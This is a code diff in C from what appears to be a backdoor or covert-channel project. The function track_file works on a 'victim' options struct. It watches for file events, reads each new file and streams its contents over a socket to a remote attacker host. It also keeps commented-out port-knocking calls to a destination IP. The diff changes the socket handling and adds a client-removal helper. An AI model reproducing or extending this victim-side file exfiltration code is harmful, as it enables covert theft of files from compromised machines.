@@ -5,7 +5,6 @@ int track_file(struct options_victim* opts) {
     int length, i = 0;
     int fd, wd;
     char buffer[EVENT_BUF_LEN] = {0};
-    char chunk[EVENT_BUF_LEN] = {0};
     char file_info[S_ARR_SIZE] = {0};
     char buf[1024] = {0};
     struct stat st = {0};
@@ -60,7 +59,6 @@ int track_file(struct options_victim* opts) {
                     } else {
                         stat(event->name, &st);
                         file_size = (int) st.st_size;
-//                        process_data(chunk, file_size);
                     }
 
                     snprintf(str_file_size, 20, "%d", (int) file_size);
@@ -69,18 +67,21 @@ int track_file(struct options_victim* opts) {
                     strcat(file_info, size);
                     strcat(file_info, str_file_size);
                     strcat(file_info, end);
-                    write(opts->atcp_socket, file_info, strlen(file_info) + 1);
-                    sleep(1);
+                    write(opts->atcp_socket[0], file_info, strlen(file_info) + 1);
+
 
                     printf("file size = %d\n", file_size);
                     while(temp_size <= file_size) {
                         byte = fread(buf, 1, 512, fp);
                         temp_size += (ssize_t) byte;
-                        write(opts->atcp_socket, buf, byte);
+                        write(opts->atcp_socket[0], buf, byte);
                         memset(buf, 0, 1024);
                     }
+                    sleep(1);
 
-
+//                    // TODO: PORT CLOSE
+//                    port_knock(opts->dest_ip, CLOSE_ATF);
+                    remove_client(opts);
                     fclose(fp);
                     memset(str_file_size, 0, 20);
                     memset(&st, 0, sizeof(struct stat));
@@ -116,6 +117,12 @@ void send_packet(struct options_victim* opts, int size, const char *str) {
         }
         memset(s_buffer, 0, TCP_SEND_SIZE);
     }
+}
+
+
+void remove_client(struct options_victim *opts) {
+    close(opts->atcp_socket[0]);
+    opts->client_count--;
 }
 
 
